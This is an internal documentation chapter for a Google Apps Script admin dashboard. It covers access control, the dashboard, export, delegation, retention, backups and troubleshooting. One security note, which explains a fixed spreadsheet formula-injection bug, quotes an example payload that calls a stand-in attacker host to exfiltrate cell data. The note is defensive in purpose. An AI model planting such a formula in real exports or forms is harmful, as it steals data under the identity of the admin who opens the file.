# Part 3: Admin (Phase 3, ISM Control Tower)

> The ISM dashboard: oversight, analytics, certificate routing, email failover, settings.
> Shared concepts live in **[Part 0: Common Reference](part-0-common.md)**; this file covers
> only Admin specifics. **Access = active ISM (InfoSec-role) personnel + accounts in
> `Admin_Notification_Config`** ([§0.6](part-0-common.md#06--security-model)).
>
> Source files: `Admin/adminView.html` (frontend), `Admin/admin_code.js` (backend),
> `Admin/*_appsscript.json` (manifest).

---

## §3.1: End-user guide 🧑 (for ISM admins)

### Accessing the system
Open the Admin web-app URL signed in with an authorized account. Two-step gate:
**Layer 1** = corporate domain check; **Layer 2** = `checkAccess_` allows accounts that are either
an **active InfoSec-role** member in `InfoSec_Email_Config` (matched by **Role**, not Member_ID) or
listed by email in the **`Admin_Notification_Config`** tab. Anyone else sees "Access Denied."
*(Earlier this was a hardcoded `INFOSEC-001/002` allowlist, which silently locked everyone out when
those IDs were renamed to `INFOSEC-ALL-1/2`, see [§0.6](part-0-common.md#06--security-model).)*

### The interface
- **Sidebar:** Dashboard · Analytics · Certificate Routing · Email Failover · Settings (with a
  collapse toggle).
- **Header:** breadcrumb + a connection status badge (green dot = connected).
- **Main content:** the active page.

### Dashboard
The default page. **Stats cards** (Total Entries, PIA Complete, Pending Approval, Denied), a
**search bar** (name / location / dept / DCS ID / email), an expandable **filter panel** (PIA
status, email-approval status, date range, DCS status, location) with removable filter chips,
and the **admin table**: DCS entries joined with PIA status and email-approval status.

Table columns: Select · Name · Location · Dept · Access Type · DCS (LogID) · DCS Status ·
PIA (X/5 submitted) · PIA Status · Email Approval · Date · Actions (View Details, Audit Logs,
Delete). Click any header to sort (toggles asc/desc).

### Viewing entry details
Open the detail modal to see DCS data (from `Metadata_JSON` / `Metadata_Agency`) and PIA
sections: **PIA 1** Program Info · **PIA 2** PII Inventory (risk meter, threshold 18) ·
**PIA 3** Stakeholders · **PIA 4** Data Lifecycle · **PIA 5** Compliance Survey · plus any
**Approver Flags**.

> ⚠️ **The Approver Flags panel showed nothing before 2026-08-12**, and its count badge always
> read 0, even on requests an approver had genuinely flagged. The dashboard asked the database for
> `ApproverFlags` while the column is named `Approver_Flags`, so the lookup silently returned
> nothing rather than erroring. Fixed. If you reviewed flagged requests before that date and
> concluded there were none, **that conclusion was based on a broken panel**, re-check those
> requests. The flags themselves were never lost; only the display was.

### Audit logs
The clipboard icon opens a modal with four tabs: **Risk Audit** (CREATE/UPDATE/DELETE/
APPROVE/REJECT events), **Approval Workflow**, **ISM Approvals**, **DivHead Approvals**.

### Deleting entries
> Deletion removes in-progress, pending, **or** complete entries. Use it only for bug cleanup
> / system maintenance.
- **Single delete:** trash icon → confirm (you may optionally notify the requestor). Removes
  the row from `Data_Collection`, `Applications`, and all three workflow sheets, and logs a
  `DELETE_ENTRY` to `Risk_Audit`.
- **Batch delete:** select rows → **Delete Selected**. Only rows with PIA status **Complete**
  are deleted; others are skipped.

### Export to Google Sheets
Select rows → **Export Selected**. A new Google Sheet (base + DCS + PIA columns) is created in
the **same Drive folder** as the source spreadsheet and opens in a new tab.

> 🚩 **Values are written as plain text on purpose (2026-08-12).** Google Sheets treats any cell
> starting with `=` as a **formula**. Before this fix, an applicant could type
> `=IMPORTXML("evil.com?d="&A1)` into a form field; it sat harmlessly in the database, then
> *executed* the moment an admin opened the export, running as **that admin's** Google identity,
> with their access. Exported cells are now text-only. If you ever see a leading apostrophe in an
> exported cell, that is this guard working, not corruption; it does not appear when printed and
> is not part of the value.

### Analytics
Four cards: **PIA Status Breakdown**, **Approval Status Distribution**, **Top Departments**
(bar charts), and **Key Metrics** (Total / Flagged / Completion Rate / Pending Review).

#### Bottlenecks: "where do requests get stuck?" *(added 2026-08-12)*
Below the four cards, loaded separately from the dashboard rows:

- **Time Waiting**, how many requests have been sitting with their current approver for
  0-3 / 4-7 / 8-14 / 15+ days.
- **Bottleneck Summary**, how many are awaiting anyone, how many are past 7 days, the longest
  single wait, and which stage holds the most.
- **Most Stuck Requests**, the 25 oldest, showing the request, the stage, **who is currently
  blocking it**, and how many days.

The clock starts when that approver was **first emailed**, not when the request was submitted, so
the number answers "how long has this person had it," which is the question worth asking.

> 💡 **Cross-check it against the reminders.** If a request shows 12 days here but the approver
> says they were never nudged, the daily reminder trigger has stopped running
> ([§2.2](part-2-pia.md#the-daily-reminder-engine-lives-here-)). That divergence is the most
> useful signal on the page.

> Requests still show "unknown" days if they predate the `NotifiedDate` column and have no usable
> submission date. They are counted separately and excluded from the buckets rather than being
> shown as 0 days old.

### Certificate routing
Lists ISM-approved applications. Pick one (status contains "Approved" and ISM-approved) →
**Route** → choose destination (**DCOPS / TechServe / Both**) → **Submit Routing** to
regenerate the certificate and send the email. You can also **Download Certificate**.

### Email failover
Entries whose emails failed to send (execution bugs) appear here to **resend** to the rightful
requestor / approver. These are **manual resend** of generic "log in to the system" notices,
**not** the primary tokenized PIA workflow emails and **not** the daily reminder
([§2.2](part-2-pia.md#22--maintenance-)). Backend: `adminResendEmail` re-fires
`notifyApprover` / `notifyApplicant` / `apiPhase3_NotifyISMember` via `sendEmailWithRetry_`.

### Settings
Two cards: **System Configuration** (key-value pairs, editable inline) and **InfoSec Email
Config** (ISM members: Member ID, Name, Email, Role, Active). **Save Changes** persists to the
spreadsheet. Reminder on/off + hour here call **PIA's** cross-app reminder API
([§2.2](part-2-pia.md#the-daily-reminder-engine-lives-here-)).

> ⚠️ **No stray spaces in link values.** When you set a downloadable's URL, in a **System Links**
> field here **or** directly in a `System_Configuration` cell, the value must be the **clean URL
> only**, with **no leading/trailing whitespace** (`https://…`, never `␣https://…`). A stray space
> makes the link invalid: the **Download** button in the DCS app won't open the file, and the value
> can fail to display/save correctly in this Settings form. Editing through this form **auto-trims**
> on Save; pasting straight into the sheet does **not**, so sheet edits are the ones to double-check.

#### Approver Delegation *(added 2026-08-12)*
When an approver goes on leave, everything sitting with them stops. Add a delegation and the review
email, the daily reminder and the approval link all go to the delegate instead.

1. Click **Edit Configuration** to unlock the form.
2. Fill in **Approver going away** and **Acts on their behalf** (both must be company accounts).
3. Optionally set **Start** and **End**. Leave Start blank for "effective now", End blank for
   "until I remove it".
4. **Reason** is shown to the delegate in the email, so they know why they received it.
5. **Add delegation.**

The list above the form shows every delegation and whether it is **in effect** today, **outside
window** (dated, but not now), or **paused**. **Remove** deletes it; future emails go straight back
to the original approver.

> 🚩 **Only ISM can create a delegation.** Approvers cannot set their own. That is deliberate: if
> they could, any approver could quietly route their own approvals to a colleague of their choosing.

> ⚠️ **Not retroactive.** A review link is cryptographically signed *when the email is sent*, so
> mail already in someone's inbox still points at the original approver. For a request that is
> already waiting, add the delegation and then use **Email Routing → Resend** to reissue it.

> ℹ️ **The decision is still recorded against the original approver**, with the delegate's address
> in the `ActedBy` column, it reads as "approved by *delegate* on behalf of *approver*."
> Delegation does **not** chain: if A delegates to B and B delegates to C, A's requests go to B.

> 🚩 **It is a real handoff, not a spare key.** While the delegation is active the original
> approver **cannot approve** the reassigned request, and it **drops off their own list**, only
> the delegate can act on it. This is on purpose: if both could decide, the two of them could
> approve the same step seconds apart and the system would have no clean answer for who actually
> decided it.
>
> What the original approver **keeps**: everything they already decided. Requests they approved
> before going on leave, and earlier rounds of this same request, all stay visible to them. Only
> the specific step that was handed over disappears. Remove or pause the delegation and it comes
> straight back to them.

#### Data Retention *(added 2026-08-12, ships switched OFF)*
Nothing in the system had ever deleted personal data: not the request rows, not approver comments,
not the audit log, not the uploaded NDA/DPA/DSA files, not the stored email bodies. This sweep
removes **closed** requests older than a set period, across all of those at once.

**It does nothing until you turn it on**, and it takes two switches, not one:

| Setting | Ships as | Meaning |
|---|---|---|
| **Retention period (months)** | 24 | How old a *closed* request must be |
| **Retention sweep** | Disabled | Master switch |
| **Mode** | Dry run | Reports only; deletes nothing even when enabled |

**Before enabling anything, click "Preview what would be deleted."** It lists how many closed
requests qualify and shows the oldest as a sample. Read that list with whoever owns the retention
policy.

> 🚩 **A purge cannot be undone.** Sheet rows are gone for good. Drive files go to the trash, so
> there is a 30-day window there and nowhere else. This is not something a developer can revert.

> ℹ️ **Requests still waiting on anyone are never touched**, at any age, and "closed" means *both*
> the DCS and PIA sides are finished. Age is counted from the request's **last decision**, not its
> submission, so a request that took eight months to approve is not purged eight months early.

#### Weekly Database Backup *(added 2026-08-12)*
The entire system's data lives in one Google Sheet. Drive's built-in version history protects
against a bad edit, but not against the file itself being deleted or corrupted. The backup job
makes a full copy of the database spreadsheet every Sunday at around 3am, into a Drive folder
named **RARS Database Backups** (created automatically on the first run). It keeps the newest
**8 copies** (roughly two months) and moves older ones to the trash, where Drive keeps them for
another 30 days.

**One-time setup (owner account, Apps Script editor, Admin project):** run `setupBackupTrigger()`
once. That is the whole installation. To take an extra backup on demand (for example, right
before enabling retention), run `runDatabaseBackup()` from the editor.

> 🚩 **If a backup fails, the script owner gets Google's trigger-failure email.** That is
> deliberate: a backup that fails silently is discovered the day you need it. Do not ignore
> those emails; each failure is also logged as a `Database Backup Failed` row in `Risk_Audit`.

> ℹ️ Backup copies are **owner-only** files (a fresh Drive copy inherits no sharing). They contain
> everything the live database contains, including personal data, so do not share the backup
> folder.

---

## §3.2: Maintenance 🛠

### Script Properties (Admin project)
*(Deploy via the golden rule: [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)*

| Property | Required | Holds |
|----------|----------|-------|
| `SPREADSHEET_ID` | Yes | ID of the shared database spreadsheet |
| `ALLOWED_DOMAIN` | Yes (when domain check on) | Corporate domain |
| `ADMIN_API_KEY` | Yes | Shared email-tracking key, **must match the PIA side** |
| `WEB_APP_URL` | Optional | Live **PIA** `/exec` for resend CTAs (missing → button omitted gracefully) |
| `SHEET_PREFIX` | Optional | Prefix if sheet tabs are namespaced |
| `BACKUP_FOLDER_ID` | Auto-set | Drive folder the weekly backup writes to; created and stored by the first `runDatabaseBackup()` run. Point it at a different folder id to relocate backups |

**Code constants** (`admin_code.js`): `ENABLED_DOMAIN_CHECK = true` (line ~145, gate is
**on**), `MAX_ROWS = 500` (cap on `getAdminData`), `SHEET_NAMES` (canonical tab names, ~line
124, the source of truth used in [§0.2](part-0-common.md#02--architecture--data-model)).

**OAuth scopes:** `spreadsheets`, `drive`, `script.external_request`, `userinfo.email`.
**Web-app settings:** `executeAs = USER_DEPLOYING`, `access = DOMAIN`, `runtimeVersion = V8`.

### Routine tasks
- Update `InfoSec_Email_Config` when ISM members change; update `System_Configuration` for
  system-wide settings.
- Archive old `Risk_Audit` entries if the sheet grows large.
- Review/clean old deployments (but **keep one**, golden rule); check Executions for errors;
  verify spreadsheet cell limits.
- After a Workspace/domain change: update `DOMAIN` / `ALLOWED_DOMAIN`; if the spreadsheet
  moves, update `SPREADSHEET_ID`; if sheets are added, update `SHEET_NAMES`.

### Adding a new downloadable form (Admin side)
A download form touches **both** apps; the DCS-side change and the full end-to-end flow are in
**[Part 1 §1.2](part-1-dcs.md#12--maintenance-)**. On the **Admin** side, so ISM can manage the
link under **Settings → System Links**, edit `Admin/adminView.html`:
1. Add an input field to the **System Links** card (~line 2073), copying the existing pattern,
   `<div class="form-group"><label>Your Label</label><input type="url" id="cfg-LINK_YOURKEY_TEMPLATE" placeholder="https://..."></div>`.
2. Add the **same key** (`LINK_YOURKEY_TEMPLATE`) to the key array inside `saveSettings()`
   (~line 6726). ⚠️ Without this, the field will *display* a value but silently **won't save** edits.
3. Redeploy the Admin project (Edit → New version,
   [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls)).

---

## §3.3: Developer handover 👨‍💻

### Backend (`admin_code.js`)
- **Entry points:** `doGet()` (auth + serve `adminView`; handles `?setup=domain`),
  `doPost()` (`action=submitDCS`, currently a domain-validating **stub**, not the real DCS
  submission, which lives in Phase 1).
- **Authorization:** `isAuthorizedDomain()` (Layer 1 domain suffix, fail-secure),
  `checkAccess_()` (Layer 2: **active InfoSec-role members + `Admin_Notification_Config` entries**,
  matched by Role/email, not hardcoded IDs). ~17 `checkAccess_` guards protect the API entry points
  ([§0.6](part-0-common.md#06--security-model)).
- **Data fetching:** `getAdminData()` reads 5 sheets, builds lookup maps (by ReqID and
  SessionID), joins rows, serializes all values to strings (avoids V8 serialization crashes),
  capped at `MAX_ROWS = 500`.
- **Audit:** `getAuditLogs(reqId, sessionId)`.
- **Delete:** *removed.* The ticket delete/close feature (hard cascading delete across 6 sheets +
  audit purge) was pulled, records are now immutable from the Admin app.
- **Export:** `exportToSheet(rows)`, new Sheet in the source folder.
- **Config:** `getConfigData()` / `saveConfigData()`.
- **Certificate routing:** `apiAdmin_*` functions (approved-app listing, cert HTML/PDF, email).
- **Email resend:** `adminResendEmail` ([§3.1](#31--end-user-guide--for-ism-admins)).
- **Helpers/diagnostics:** `sheetToObjects_()`, `computePiaStatus_()`,
  `computeApprovalStatus_()`, `parseMetadata_()`, `debugSheets()`, `getAdminDataDebug()`,
  `ping()`.

### Frontend (`adminView.html`)
Single HTML file (markup + CSS + inline SVG icons + JS), navy DM-Sans design system,
responsive with sidebar collapse. Key fns: `loadData()`, `renderTable()`, `filterRows()`,
`sortTable()`, `openDetailModal()`, `showAuditLogs()`,
`exportSelected()`, `showAnalytics()`, `loadApprovedApplications()`, `checkRoutingStatus()`,
`loadConfigData()`, `saveConfigData()`.

### Data flow
Open URL → `doGet` (optional `?setup=domain`) → `isAuthorizedDomain` (Layer 1) →
`checkAccess_` (Layer 2, INFOSEC) → serve `adminView` → frontend calls `getAdminData()` →
backend reads 5 sheets, joins DCS↔Applications (via `Linked_ReqID`/`ReqID`) and workflows (via
`SessionID`), returns string-only objects → table/stats render → user actions trigger more
`google.script.run` calls.

### Key design notes
Single HTML file (no build step); in-memory joins from raw sheet data; `sheetToObjects`
pattern (header row → keyed objects); all row values serialized to strings (prevents V8
crashes from Date/nested objects); two-layer auth; `MAX_ROWS = 500` to stay under execution
limits; export placed in the source folder.

---

## §3.4: Troubleshooting

### For end users (ISM admins)
| Problem | Solution |
|---------|----------|
| "Access Denied" | You must be an active `InfoSec`-role member in `InfoSec_Email_Config` **or** listed (by email) in `Admin_Notification_Config`. |
| Blank page / spinning loader | Refresh; if it persists the spreadsheet may be inaccessible, contact the admin. |
| "No data available" | Spreadsheet may be empty or still loading; refresh. |
| Search returns nothing | Broaden the term; clear active filters. |
| "Export failed" | Could not create the new Sheet, check Drive permissions. |
| Stale data after refresh | Hard refresh (Ctrl/Cmd+Shift+R), cache may be stale. |
| A downloadable won't open (DCS), or a Settings link field looks blank | The stored link value likely has a **leading/trailing space**. Open the Settings field (or the `System_Configuration` cell) and delete any whitespace around the URL, then Save. |

### For administrators / developers
| Problem | Solution |
|---------|----------|
| `clasp push` fails | *(We don't ship via clasp, see [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)* Use the manual copy-paste + Edit→New version flow. |
| Changes don't appear | You likely created a **New deployment** instead of a new version, golden rule, [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
| `getAdminData` returns null | V8 unhandled exception, check Executions/Stackdriver; verify sheet names + headers. |
| "Sheet not found" | Run `debugSheets()`; fix `SHEET_NAMES` or `SHEET_PREFIX`. |
| `SPREADSHEET_ID` not set | Set it in Script Properties. |
| Domain blocks all users | Verify `DOMAIN`/`ALLOWED_DOMAIN`; `?setup=<domain>` reconfigures both. |
| ISM member still denied | Verify their `Member_Email` matches, `Role` is `InfoSec`, and `IsActive` isn't `NO`. For a non-ISM admin, add them (by email) to `Admin_Notification_Config`. |
| App down for everyone (perm error) | The app was likely **deployed by a non-owner**, redeploy from the owner account (`<owner-account>`), [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
| Stats all zero | Run `getAdminDataDebug()` to verify each sheet is readable. |

---

*← [Part 2: PIA](part-2-pia.md) · Next: [Appendices](appendices.md) →*
